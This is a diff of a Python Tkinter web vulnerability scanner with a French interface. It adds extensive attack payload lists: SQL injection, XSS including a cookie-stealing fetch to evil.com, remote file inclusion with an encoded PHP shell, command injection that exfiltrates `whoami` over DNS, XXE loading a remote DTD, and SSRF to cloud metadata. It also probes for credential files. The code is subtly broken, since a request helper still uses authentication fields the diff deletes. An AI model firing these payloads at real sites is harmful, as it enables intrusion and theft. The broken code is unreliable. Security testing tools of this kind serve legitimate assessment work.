@@ -5201,26 +5201,88 @@ class WebScannerTab(BaseTab):
     PAYLOADS = {
         "sqli_error": ["'", "\"", "1'", "1\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
                        "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "1' AND 1=1--", "1' AND 1=2--",
-                       "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--"],
-        "sqli_blind": ["1' AND '1'='1", "1' AND '1'='2", "1' AND SLEEP(3)--",
-                       "1' AND BENCHMARK(5000000,MD5('x'))--", "1' WAITFOR DELAY '0:0:3'--"],
+                       "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--",
+                       "' OR SLEEP(5)--", "1' OR '1'='1' /*", "1\" OR \"1\"=\"1\" /*"],
+        "sqli_blind_time": ["1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('x'))--",
+                           "1' WAITFOR DELAY '0:0:5'--", "1' AND pg_sleep(5)--",
+                           "1' AND sleep(5)#", "1' WAITFOR DELAY '0:0:5'-- -"],
+        "sqli_blind_bool": ["1' AND '1'='1", "1' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
+                           "1' OR '1'='1'--", "' AND 1=1--", "' AND 1=2--"],
+        "sqli_oob": ["1'; DECLARE @q VARCHAR(99);SET @q='\\'+CONVERT(VARCHAR,@@VERSION)+'.burpcollab.net';EXEC master.dbo.xp_dirtree @q;--",
+                    "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@VERSION,'.burpcollab.net\\\\test.txt'))--"],
         "xss": ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
                 '\"><script>alert(1)</script>', '<svg onload=alert(1)>',
                 '" onmouseover="alert(1)"', 'javascript:alert(1)',
-                '<img src=x onerror=alert(1)>', '<body onload=alert(1)>',
-                '<details open ontoggle=alert(1)>'],
+                '<body onload=alert(1)>', '<details open ontoggle=alert(1)>',
+                '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
+                '<input onfocus=alert(1) autofocus>', '<a onmousemove=alert(1)>x</a>',
+                '\'+alert(1)+\'', '"><svg/onload=alert(1)>', '<script>eval(atob("YWxlcnQoMSk="))</script>'],
+        "xss_dom": ['#<script>alert(1)</script>', 'javascript:alert(1)//',
+                   '\'-alert(1)-\'', '\"-alert(1)-\"'],
+        "xss_stored": ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
         "lfi": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                 "../../../etc/passwd%00", "....//....//....//etc/passwd",
-                "../../../../../../../../etc/passwd"],
-        "rfi": ["http://evil.com/shell.txt?", "https://evil.com/shell.txt?"],
+                "../../../../../../../../etc/passwd",
+                "....//....//....//....//etc/passwd",
+                "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",
+                "../../../etc/passwd%00.png", "../../../etc/passwd%2500",
+                "file:///etc/passwd", "php://filter/read=convert.base64-encode/resource=config"],
+        "rfi": ["http://evil.com/shell.txt?", "https://evil.com/shell.txt?",
+                "http://evil.com/phpinfo.txt?", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"],
         "cmd": ["; id", "| id", "`id`", "$(id)", "& id", "| echo PWNED",
-                "; ping -c 1 127.0.0.1", "| ping -n 1 127.0.0.1"],
+                "; ping -c 1 127.0.0.1", "| ping -n 1 127.0.0.1",
+                "& whoami &", "&& whoami &&", "|| whoami ||",
+                ";cat /etc/passwd", "|cat /etc/passwd",
+                "$(cat /etc/passwd)", "`cat /etc/passwd`",
+                "& nslookup burpcollab.net &",
+                "; nslookup `whoami`.burpcollab.net;"],
+        "cmd_blind": ["; ping -c 10 127.0.0.1 &", "| ping -n 10 127.0.0.1",
+                      "; sleep 10", "| timeout 10", "& ping -c 5 127.0.0.1 &"],
         "ssti": ["{{7*7}}", "${7*7}", "{{config}}", "${7*'7'}}",
-                 "#{7*7}", "<%= 7*7 %>", "{{''.__class__.__mro__}}"],
-        "open_redirect": ["//evil.com", "https://evil.com", "//evil.com@google.com"],
-        "path_traversal": ["../../../", "..\\..\\..\\", "%2e%2e%2f", "..%252f..%252f"],
-        "xxe": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'],
-        "idor": ["1", "2", "3", "100", "999"],
+                 "#{7*7}", "<%= 7*7 %>", "{{''.__class__.__mro__}}",
+                 "{{7*'7'}}", "{{self}}", "{{_self.env}}",
+                 "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+                 "#{{7*7}}", "{{'7'*7}}",
+                 "<%25%3D+7*7+%25>", "${{7*7}}",
+                 "{php}echo 'PWNED';{/php}",
+                 "{{['id']|filter('system')}}",
+                 "${7*7}", "@(7*7)", "{{#with \"s\" as |string|}}{{#with \"e\"}}",
+                 "{{include(\"/etc/passwd\")}}",
+                 "${{#with \"s\" as |string|}}x{{/with}}",
+                 "${7*7}boom", "<%=7*7%>", "-${7*7}-"],
+        "open_redirect": ["//evil.com", "https://evil.com", "//evil.com@google.com",
+                          "//evil.com:443@google.com", "https://evil.com:443",
+                          "///evil.com", "/\\evil.com", "http://evil.com\\@google.com",
+                          "javascript:document.location='https://evil.com'",
+                          "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
+        "path_traversal": ["../../../", "..\\..\\..\\", "%2e%2e%2f", "..%252f..%252f",
+                          "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%252e%252e%252f",
+                          "..%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
+                          "....//....//....//", "..%5c..%5c..%5c"],
+        "xxe": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>1</root>',
+                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;%int;%trait;]><root>1</root>',
+                '<?xml version="1.0"?><root><foo>${xxe}</foo></root>'],
+        "xxe_blind": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><root>1</root>'],
+        "idor": ["1", "2", "3", "100", "999", "admin", "user", "test",
+                "00000000-0000-0000-0000-000000000001",
+                "00000000-0000-0000-0000-000000000002",
+                "0", "-1", "null", "undefined", "NaN", "true", "false"],
+        "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22",
+                "http://127.0.0.1:3306", "http://127.0.0.1:6379",
+                "http://localhost:8080/_config", "file:///etc/passwd",
+                "http://[::1]:22", "http://0.0.0.0:22",
+                "http://0x7f000001:22", "http://2130706433:22",
+                "http://0177.0.0.1:22", "http://127.1:22"],
+        "nosqli": ['{"$gt": ""}', '{"$ne": ""}', '{"$where": "1==1"}',
+                  '{"$regex": ".*"}', "1' || '1'=='1", "';return true;var foo='"],
+        "ldapi": ["*", "*)(uid=*))(|(uid=*", "*)(|(uid=*", "*)(uid=*))"],
+        "xpathi": ["' or '1'='1", "' and '1'='2", "' or 1=1 or '",
+                  "' or true() or '", "' or ''='"],
+        "hhi": ["127.0.0.1", "localhost", "evil.com",
+               "127.0.0.1:80", "0.0.0.0"],
+        "crlf": ["%0d%0aSet-Cookie:%20test=1", "%0d%0aX-XSS-Protection:%200",
+                "%0d%0aLocation:%20/evil", "%0aX-CRlf-Test:%201"],
     }
 
     COMMON_FILES = [
@@ -5229,34 +5291,91 @@ class WebScannerTab(BaseTab):
         "/crossdomain.xml", "/clientaccesspolicy.xml", "/WEB-INF/web.xml",
         "/.DS_Store", "/dump.sql", "/backup.sql", "/db.sql", "/.svn/entries",
         "/shell.php", "/cmd.php", "/upload.php", "/api", "/graphql",
+        "/swagger.json", "/swagger-ui.html", "/openapi.json",
+        "/actuator/health", "/actuator/env", "/actuator/dump",
+        "/console", "/admin/", "/wp-json/", "/wp-content/",
+        "/server-status", "/server-info", "/info.php", "/test.php",
+        "/.aws/credentials", "/.azure/credentials", "/config.json",
+        "/.npmrc", "/.dockercfg", "/storage/logs/laravel.log",
+        "/debug/default/view", "/.git/HEAD", "/.gitignore",
+        "/Procfile", "/package.json", "/Dockerfile", "/docker-compose.yml",
+        "/.terraform/", "/server.crt", "/server.key",
+        "/WEB-INF/web.xml", "/WEB-INF/database.properties",
+        "/META-INF/MANIFEST.MF", "/error", "/500",
     ]
 
     SECURITY_HEADERS = [
         "strict-transport-security", "x-frame-options", "x-content-type-options",
         "content-security-policy", "x-xss-protection", "referrer-policy",
         "permissions-policy", "cross-origin-opener-policy",
+        "cross-origin-embedder-policy", "cross-origin-resource-policy",
     ]
+
+    TECH_SIGNATURES = {
+        "PHP": [("header", "x-powered-by", "php"), ("body", r"phpversion\(\)")],
+        "Apache": [("header", "server", "apache"), ("body", r"mod_")],
+        "nginx": [("header", "server", "nginx"), ("header", "x-powered-by", "nginx")],
+        "IIS": [("header", "server", "iis"), ("header", "x-powered-by", "asp.net")],
+        "WordPress": [("body", r"wp-content"), ("body", r"wp-includes"), ("cookie", "wordpress_")],
+        "Drupal": [("body", r"drupal"), ("header", "x-drupal")],
+        "Joomla": [("body", r"joomla"), ("body", r"com_content")],
+        "Laravel": [("cookie", "laravel_session"), ("body", r"csrf-token")],
+        "Django": [("cookie", "csrftoken"), ("body", r"django")],
+        "Ruby on Rails": [("cookie", "_session"), ("header", "x-rails")],
+        "ASP.NET": [("header", "x-aspnet-version"), ("cookie", "asp.net")],
+        "Node.js/Express": [("header", "x-powered-by", "express")],
+        "Tomcat": [("header", "server", "tomcat"), ("body", r"tomcat")],
+        "JBoss": [("body", r"jboss"), ("header", "x-powered-by", "jboss")],
+        "Jetty": [("header", "server", "jetty")],
+        "Cloudflare": [("header", "server", "cloudflare"), ("header", "cf-ray")],
+        "Akamai": [("header", "server", "akamai")],
+        "Fastly": [("header", "server", "fastly")],
+        "Varnish": [("header", "via", "varnish"), ("header", "x-varnish")],
+    }
+
+    WAF_SIGNATURES = {
+        "Cloudflare": [("header", "cf-ray"), ("body", "cloudflare-nginx")],
+        "ModSecurity": [("body", r"mod_security"), ("body", "ModSecurity")],
+        "AWS WAF": [("body", "aws"), ("header", "x-amzn-")],
+        "F5 BIG-IP": [("cookie", "F5_"), ("header", "x-request-id")],
+        "Fortinet": [("body", "fortigate"), ("header", "x-blocked-by")],
+        "Akamai": [("header", "x-akamai"), ("body", "akamai")],
+        "Sucuri": [("body", "sucuri"), ("header", "x-sucuri")],
+        "Barracuda": [("body", "barracuda"), ("cookie", "barra_counter")],
+        "Imperva": [("cookie", "incapsula"), ("body", "incapsula")],
+        "Wordfence": [("body", "wordfence"), ("cookie", "wordfence")],
+    }
+
+    CVSS_SCORES = {
+        "sqli": 9.8, "sqli_blind": 8.2, "xss": 6.1, "xss_dom": 6.1, "xss_stored": 7.2,
+        "lfi": 7.5, "rfi": 8.8, "cmd": 9.8, "cmd_blind": 8.1, "ssti": 9.8,
+        "open_redirect": 4.7, "path_traversal": 7.5, "xxe": 8.2, "xxe_blind": 7.3,
+        "idor": 5.3, "ssrf": 8.2, "nosqli": 9.8, "ldapi": 9.8, "xpathi": 9.8,
+        "hhi": 6.1, "crlf": 5.3, "cors": 6.1, "headers": 5.3, "info": 3.7,
+        "methods": 5.3, "files": 7.5,
+    }
 
     def __init__(self, parent, app):
         super().__init__(parent, app)
         self.stop_flag = threading.Event()
         self.vulns = []
         self.crawled_urls = set()
+        self.tech_found = []
+        self.waf_found = []
         self.build()
 
     def build(self):
         main = ttk.Frame(self.parent)
         main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
 
-        # ── Config ──
-        cfg = ttk.LabelFrame(main, text="Configuration du Scan")
+        cfg = ttk.LabelFrame(main, text="Web Scanner Ultra — Configuration")
         cfg.pack(fill=tk.X, pady=(0, 6))
 
         ttk.Label(cfg, text="URL cible:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
         self.entry_url = ttk.Entry(cfg, width=50, font=("TkDefaultFont", 11))
         self.entry_url.grid(row=0, column=1, padx=5, pady=4, sticky="ew")
         cfg.columnconfigure(1, weight=1)
-        self.entry_url.insert(0, "http://example.com")
+        self.entry_url.insert(0, "http://testphp.vulnweb.com")
 
         ttk.Label(cfg, text="Profondeur:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
         self.spin_depth = ttk.Spinbox(cfg, from_=1, to=5, width=4)
@@ -5264,47 +5383,57 @@ class WebScannerTab(BaseTab):
         self.spin_depth.grid(row=0, column=3, padx=5, pady=4)
 
         ttk.Label(cfg, text="Threads:").grid(row=0, column=4, padx=5, pady=4, sticky="w")
-        self.spin_threads = ttk.Spinbox(cfg, from_=1, to=20, width=4)
-        self.spin_threads.set(5)
+        self.spin_threads = ttk.Spinbox(cfg, from_=1, to=50, width=4)
+        self.spin_threads.set(10)
         self.spin_threads.grid(row=0, column=5, padx=5, pady=4)
 
-        self.var_auth = tk.BooleanVar(value=False)
-        ttk.Checkbutton(cfg, text="Auth (Cookie)", variable=self.var_auth).grid(row=0, column=6, padx=5)
-        self.entry_cookie = ttk.Entry(cfg, width=30, show="*")
-        self.entry_cookie.grid(row=0, column=7, padx=5, pady=4)
-        self.entry_cookie.insert(0, "session=...")
+        ttk.Label(cfg, text="Délai (ms):").grid(row=0, column=6, padx=5, pady=4, sticky="w")
+        self.spin_delay = ttk.Spinbox(cfg, from_=0, to=5000, width=5, increment=100)
+        self.spin_delay.set(200)
+        self.spin_delay.grid(row=0, column=7, padx=5, pady=4)
 
-        # ── Checkboxes ──
+        self.var_post = tk.BooleanVar(value=True)
+        ttk.Checkbutton(cfg, text="POST body", variable=self.var_post).grid(row=0, column=8, padx=3)
+        self.var_json = tk.BooleanVar(value=True)
+        ttk.Checkbutton(cfg, text="JSON", variable=self.var_json).grid(row=0, column=9, padx=3)
+        self.var_fingerprint = tk.BooleanVar(value=True)
+        ttk.Checkbutton(cfg, text="Fingerprint", variable=self.var_fingerprint).grid(row=0, column=10, padx=3)
+
         self.checks = {}
-        checks_frame = ttk.LabelFrame(main, text="Tests à effectuer")
+        checks_frame = ttk.LabelFrame(main, text="Tests à effectuer (tous activés par défaut)")
         checks_frame.pack(fill=tk.X, pady=(0, 6))
         checks = [
-            ("sqli", "SQL Injection"), ("xss", "XSS"), ("lfi", "LFI/RFI"),
-            ("cmd", "Command Injection"), ("ssti", "SSTI"), ("open_redirect", "Open Redirect"),
-            ("path_traversal", "Path Traversal"), ("xxe", "XXE"),
-            ("idor", "IDOR"), ("files", "Fichiers sensibles"), ("headers", "Headers sécurité"),
-            ("methods", "Méthodes HTTP"), ("cors", "CORS"), ("info", "Info Disclosure"),
+            ("sqli", "SQLi Error"), ("sqli_blind", "SQLi Blind"), ("xss", "XSS Reflété"),
+            ("xss_dom", "XSS DOM"), ("lfi", "LFI"), ("rfi", "RFI"),
+            ("cmd", "CMDi"), ("ssti", "SSTI"), ("xxe", "XXE"),
+            ("ssrf", "SSRF"), ("idor", "IDOR"), ("hhi", "Host Header"),
+            ("nosqli", "NoSQLi"), ("xpathi", "XPathi"), ("crlf", "CRLF"),
+            ("open_redirect", "Redirect"), ("path_traversal", "Path Trav."),
+            ("headers", "Headers"), ("methods", "Méthodes"), ("cors", "CORS"),
+            ("files", "Fichiers"), ("info", "Info Disc."),
         ]
         for i, (key, label) in enumerate(checks):
             self.checks[key] = tk.BooleanVar(value=True)
             ttk.Checkbutton(checks_frame, text=label, variable=self.checks[key]).grid(
-                row=i // 5, column=i % 5, padx=8, pady=2, sticky="w")
+                row=i // 6, column=i % 6, padx=6, pady=1, sticky="w")
 
-        # ── Buttons ──
-        btnf = ttk.Frame(cfg)
-        btnf.grid(row=1, column=0, columnspan=8, pady=6)
-        self.btn_scan = ttk.Button(btnf, text="▶ Scan Complet", command=self.run_scan, width=18)
-        self.btn_scan.pack(side=tk.LEFT, padx=5)
+        btnf = ttk.Frame(main)
+        btnf.pack(fill=tk.X, pady=4)
+        self.btn_scan = ttk.Button(btnf, text="▶ Scan Ultra Complet", command=self.run_scan, width=22)
+        self.btn_scan.pack(side=tk.LEFT, padx=4)
+        self.btn_ultra = ttk.Button(btnf, text="🔥 Scan Max (tout activé)", command=self.run_ultra, width=22)
+        self.btn_ultra.pack(side=tk.LEFT, padx=4)
         self.btn_stop = ttk.Button(btnf, text="⏹ Arrêter", command=self.stop_scan, state=tk.DISABLED, width=12)
-        self.btn_stop.pack(side=tk.LEFT, padx=5)
-        self.btn_crawl = ttk.Button(btnf, text="🕷 Crawler seulement", command=self.run_crawl, width=18)
-        self.btn_crawl.pack(side=tk.LEFT, padx=5)
-        ttk.Button(btnf, text="Export HTML", command=self.run_export, width=14).pack(side=tk.LEFT, padx=5)
+        self.btn_stop.pack(side=tk.LEFT, padx=4)
+        self.btn_crawl = ttk.Button(btnf, text="🕷 Crawler", command=self.run_crawl, width=14)
+        self.btn_crawl.pack(side=tk.LEFT, padx=4)
+        self.btn_finger = ttk.Button(btnf, text="🔍 Fingerprint", command=self.run_fingerprint, width=16)
+        self.btn_finger.pack(side=tk.LEFT, padx=4)
+        ttk.Button(btnf, text="📊 Export HTML", command=self.run_export, width=16).pack(side=tk.LEFT, padx=4)
         self.lbl_progress = ttk.Label(btnf, text="Prêt", foreground="gray")
         self.lbl_progress.pack(side=tk.LEFT, padx=10)
 
-        # ── Results ──
-        res_frame = ttk.LabelFrame(main, text="Résultats du Scan")
+        res_frame = ttk.LabelFrame(main, text="Vulnérabilités & Rapports")
         res_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 4))
 
         paned = ttk.PanedWindow(res_frame, orient=tk.HORIZONTAL)
@@ -5312,7 +5441,7 @@ class WebScannerTab(BaseTab):
 
         left_frame = ttk.Frame(paned)
         paned.add(left_frame, weight=1)
-        ttk.Label(left_frame, text="Vulnérabilités trouvées:", font=("TkDefaultFont", 9, "bold")).pack(anchor="w")
+        ttk.Label(left_frame, text="Vulnérabilités:", font=("TkDefaultFont", 9, "bold")).pack(anchor="w")
         self.vuln_list = tk.Listbox(left_frame, height=10, font=("Consolas", 9))
         self.vuln_list.pack(fill=tk.BOTH, expand=True, pady=2)
         self.vuln_list.bind("<<ListboxSelect>>", self.on_vuln_select)
@@ -5325,12 +5454,229 @@ class WebScannerTab(BaseTab):
 
         self.output = self.make_output(main, height=8)
 
-    # ── Running ──
+    # ── Utility ──
+    def _build_url(self, url, param, value):
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query, keep_blank_values=True)
+        qs[param] = [value]
+        new_qs = urlencode(qs, doseq=True)
+        return urlunparse(parsed._replace(query=new_qs))
+
+    def _req(self, url, method="GET", data=None, headers=None, timeout=8):
+        s = self.app.session
+        h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"}
+        if headers:
+            h.update(headers)
+        if self.var_auth.get():
+            cookie = self.entry_cookie.get().strip()
+            if cookie:
+                h["Cookie"] = cookie
+        try:
+            if method == "GET":
+                return s.get(url, headers=h, timeout=timeout, verify=False)
+            return s.request(method, url, headers=h, data=data, timeout=timeout, verify=False)
+        except:
+            return None
+
+    def _delay(self):
+        d = int(self.spin_delay.get())
+        if d > 0:
+            time.sleep(d / 1000.0)
+
+    def _cvss(self, vuln_type):
+        return self.CVSS_SCORES.get(vuln_type, 5.0)
+
+    def _risk_from_cvss(self, score):
+        if score >= 9.0: return "Critique"
+        if score >= 7.0: return "Élevé"
+        if score >= 5.0: return "Moyen"
+        if score >= 3.0: return "Faible"
+        return "Info"
+
+    # ── Control ──
     def stop_scan(self):
         self.stop_flag.set()
         self.btn_scan.config(state=tk.NORMAL)
+        self.btn_ultra.config(state=tk.NORMAL)
         self.btn_stop.config(state=tk.DISABLED)
         self.lbl_progress.config(text="Arrêté")
+
+    def _reset(self):
+        self.vulns = []
+        self.crawled_urls = set()
+        self.tech_found = []
+        self.waf_found = []
+        self.vuln_list.delete(0, tk.END)
+        self.vuln_detail.delete("1.0", tk.END)
+        self.stop_flag.clear()
+        self.btn_scan.config(state=tk.DISABLED)
+        self.btn_ultra.config(state=tk.DISABLED)
+        self.btn_stop.config(state=tk.NORMAL)
+
+    def _finish(self):
+        self.btn_scan.config(state=tk.NORMAL)
+        self.btn_ultra.config(state=tk.NORMAL)
+        self.btn_stop.config(state=tk.DISABLED)
+
+    def _add_vuln(self, name, risk, url, detail, evidence="", vuln_type=""):
+        cvss = self._cvss(vuln_type) if vuln_type else (9.0 if risk == "Critique" else 7.0 if risk == "Élevé" else 5.0)
+        v = {"name": name, "risk": risk, "url": url, "detail": detail, "evidence": evidence, "cvss": cvss, "type": vuln_type}
+        self.vulns.append(v)
+        icon = {"Critique": "🔴", "Élevé": "🟠", "Moyen": "🟡", "Faible": "🔵", "Info": "⚪"}
+        prefix = icon.get(risk, "⚪")
+        self.app.after(0, lambda: self.vuln_list.insert(tk.END, f"{prefix} [{risk}] CVSS:{cvss} {name}"))
+        tag = "error" if risk in ("Critique", "Élevé") else "warning" if risk == "Moyen" else "success"
+        self.log(self.output, f"  {prefix} [{risk}] CVSS {cvss} — {name} — {url[:80]}", tag)
+
+    def on_vuln_select(self, event):
+        sel = self.vuln_list.curselection()
+        if not sel: return
+        idx = sel[0]
+        if idx < len(self.vulns):
+            v = self.vulns[idx]
+            self.vuln_detail.delete("1.0", tk.END)
+            self.vuln_detail.insert(tk.END, f"Vulnérabilité: {v['name']}\n")
+            self.vuln_detail.insert(tk.END, f"Risque: {v['risk']}")
+            if v.get("cvss"):
+                self.vuln_detail.insert(tk.END, f" (CVSS {v['cvss']})\n")
+            else:
+                self.vuln_detail.insert(tk.END, "\n")
+            self.vuln_detail.insert(tk.END, f"URL: {v['url']}\n\n")
+            self.vuln_detail.insert(tk.END, f"Détail:\n{v['detail']}\n")
+            if v.get("evidence"):
+                self.vuln_detail.insert(tk.END, f"\nPreuve:\n{v['evidence']}\n")
+
+    # ═══════════════════════════════════════════════
+    #  PHASE 0 — RECONNAISSANCE
+    # ═══════════════════════════════════════════════
+
+    def run_fingerprint(self):
+        self.clear(self.output)
+        url = self.entry_url.get().strip()
+        if not url:
+            messagebox.showwarning("Attention", "Entrez une URL.")
+            return
+        if not url.startswith("http"):
+            url = "https://" + url
+        self.run_thread(lambda: self.do_fingerprint(url))
+
+    def do_fingerprint(self, url):
+        self.log(self.output, f"{'═'*60}", "bold")
+        self.log(self.output, "  CyberAI — Reconnaissance & Fingerprinting", "bold")
+        self.log(self.output, f"  Cible: {url}", "bold")
+        self.log(self.output, f"{'═'*60}\n")
+        self.lbl_progress.config(text="Fingerprinting...")
+        r = self._req(url)
+        if not r:
+            self.log(self.output, "  ✗ Impossible d'atteindre la cible", "error")
+            self.lbl_progress.config(text="Erreur")
+            return
+
+        self.log(self.output, "[Technologies]", "bold")
+        for tech in self._fingerprint(r):
+            self.log(self.output, f"  ✓ {tech}", "success")
+
+        self.log(self.output, "\n[WAF / Protection]", "bold")
+        wafs = self._detect_waf(r)
+        if wafs:
+            for w in wafs:
+                self.log(self.output, f"  ⚠ {w}", "warning")
+        else:
+            self.log(self.output, "  ✓ Aucun WAF détecté", "success")
+
+        self.log(self.output, "\n[Headers Sécurité]", "bold")
+        present = {k.lower() for k in r.headers}
+        for h in self.SECURITY_HEADERS:
+            if h in present:
+                self.log(self.output, f"  ✓ {h}: {r.headers.get(h)[:60]}", "success")
+            else:
+                self.log(self.output, f"  ✗ {h} — manquant", "warning")
+
+        self.log(self.output, "\n[Certificat SSL]", "bold")
+        if url.startswith("https"):
+            try:
+                import ssl, socket
+                host = url.split("//")[1].split("/")[0].split(":")[0]
+                ctx = ssl.create_default_context()
+                with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
+                    s.settimeout(5)
+                    s.connect((host, 443))
+                    cert = s.getpeercert()
+                    if cert:
+                        self.log(self.output, f"  ✓ Sujet: {cert.get('subject', [('?',)])[0][0][1]}", "success")
+                        self.log(self.output, f"  ✓ Émetteur: {cert.get('issuer', [('?',)])[0][0][1]}")
+                        self.log(self.output, f"  ✓ Expire: {cert.get('notAfter', '?')}")
+            except Exception as e:
+                self.log(self.output, f"  SSL: {e}", "warning")
+        else:
+            self.log(self.output, "  - Pas de SSL (HTTP)", "warning")
+
+        self.log(self.output, "\n[Server Info]", "bold")
+        for k in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Runtime"]:
+            v = r.headers.get(k, "")
+            if v:
+                self.log(self.output, f"  {k}: {v}")
+
+        self.log(self.output, "\n[Robots.txt]", "bold")
+        try:
+            rr = self._req(url.rstrip("/") + "/robots.txt")
+            if rr and rr.status_code == 200:
+                for line in rr.text.split("\n")[:10]:
+                    self.log(self.output, f"  {line.strip()}")
+        except:
+            pass
+
+        self.log(self.output, f"\n{'═'*60}\n  Fingerprint terminé", "bold")
+        self.lbl_progress.config(text="Fingerprint OK")
+
+    def _fingerprint(self, response):
+        results = []
+        text = response.text.lower()
+        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+        for tech, sigs in self.TECH_SIGNATURES.items():
+            for stype, key, *val in sigs:
+                if stype == "header":
+                    if key in headers and (not val or val[0] in headers[key]):
+                        results.append(tech)
+                        break
+                elif stype == "body":
+                    import re
+                    if re.search(key, text):
+                        results.append(tech)
+                        break
+                elif stype == "cookie":
+                    if any(key in c for c in response.headers.get("set-cookie", "").lower().split(";")):
+                        results.append(tech)
+                        break
+        self.tech_found = results
+        return results
+
+    def _detect_waf(self, response):
+        results = []
+        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+        text = response.text.lower()
+        for waf, sigs in self.WAF_SIGNATURES.items():
+            for stype, key, *val in sigs:
+                if stype == "header":
+                    if any(k in headers for k in [key]) and (not val or val[0] in str(headers)):
+                        results.append(waf)
+                        break
+                elif stype == "body":
+                    import re
+                    if re.search(key, text):
+                        results.append(waf)
+                        break
+                elif stype == "cookie":
+                    if any(key in c for c in response.headers.get("set-cookie", "").lower()):
+                        results.append(waf)
+                        break
+        self.waf_found = results
+        return results
+
+    # ═══════════════════════════════════════════════
+    #  PHASE 1 — CRAWLING
+    # ═══════════════════════════════════════════════
 
     def run_crawl(self):
         self.clear(self.output)
@@ -5353,8 +5699,10 @@ class WebScannerTab(BaseTab):
         self.lbl_progress.config(text="Crawling...")
         self._crawl(url, depth, 0)
         self.log(self.output, f"\n✓ URLs trouvées: {len(self.crawled_urls)}", "success")
-        for u in sorted(self.crawled_urls):
+        for u in sorted(self.crawled_urls)[:100]:
             self.log(self.output, f"  {u}")
+        if len(self.crawled_urls) > 100:
+            self.log(self.output, f"  ... et {len(self.crawled_urls)-100} de plus")
         self.lbl_progress.config(text=f"{len(self.crawled_urls)} URLs")
 
     def _crawl(self, url, max_depth, depth):
@@ -5364,54 +5712,39 @@ class WebScannerTab(BaseTab):
             return
         self.crawled_urls.add(url)
         try:
-            r = self.app.session.get(url, timeout=8, verify=False)
+            r = self._req(url, timeout=8)
+            if not r:
+                return
             import re as re_m
             links = re_m.findall(r'href=[\'"]?([^\'" >]+)', r.text)
             forms = re_m.findall(r'<form[^>]*action=[\'"]?([^\'"> ]+)', r.text)
-            for link in links + forms:
+            scripts = re_m.findall(r'src=[\'"]?([^\'" >]+)', r.text)
+            all_links = links + forms + scripts
+            for link in all_links:
                 if self.stop_flag.is_set():
                     break
-                full = link if link.startswith("http") else (
-                    url.rstrip("/") + "/" + link.lstrip("/") if link.startswith("/") else
-                    url.rstrip("/") + "/" + link
-                )
-                if full.startswith("http") and url.split("/")[2] in full:
+                if link.startswith("http"):
+                    full = link
+                elif link.startswith("/"):
+                    base = f"{url.split('/')[0]}//{url.split('/')[2]}"
+                    full = base + link
+                elif link.startswith("//"):
+                    full = "https:" + link
+                elif link.startswith("#") or link.startswith("javascript:"):
+                    continue
+                else:
+                    full = url.rstrip("/") + "/" + link
+                domain = url.split("/")[2].split(":")[0]
+                if domain in full:
                     self._crawl(full, max_depth, depth + 1)
         except:
             pass
 
-    def run_scan(self):
-        self.clear(self.output)
-        self.vulns = []
-        self.vuln_list.delete(0, tk.END)
-        self.vuln_detail.delete("1.0", tk.END)
-        url = self.entry_url.get().strip()
-        if not url:
-            messagebox.showwarning("Attention", "Entrez une URL.")
-            return
-        if not url.startswith("http"):
-            url = "https://" + url
-        depth = int(self.spin_depth.get())
-        n_threads = int(self.spin_threads.get())
-        self.stop_flag.clear()
-        self.btn_scan.config(state=tk.DISABLED)
-        self.btn_stop.config(state=tk.NORMAL)
-        self.run_thread(lambda: self.do_scan(url, depth, n_threads))
+    # ═══════════════════════════════════════════════
+    #  PHASE 2 — PASSIVE SCAN
+    # ═══════════════════════════════════════════════
 
-    def do_scan(self, url, depth, n_threads):
-        self.log(self.output, f"{'═'*60}", "bold")
-        self.log(self.output, f"  CyberAI Web Scanner — Scan Complet", "bold")
-        self.log(self.output, f"  Cible: {url}", "bold")
-        self.log(self.output, f"{'═'*60}\n", "bold")
-
-        # Phase 1: Crawl
-        self.lbl_progress.config(text="Phase 1: Crawling...")
-        self.log(self.output, "[Phase 1] Crawling du site...", "bold")
-        self._crawl(url, depth, 0)
-        self.log(self.output, f"  ✓ {len(self.crawled_urls)} URLs découvertes\n")
-
-        # Phase 2: Passive Scan
-        self.lbl_progress.config(text="Phase 2: Scan passif...")
+    def _passive_scan(self, url):
         self.log(self.output, "[Phase 2] Analyse passive...", "bold")
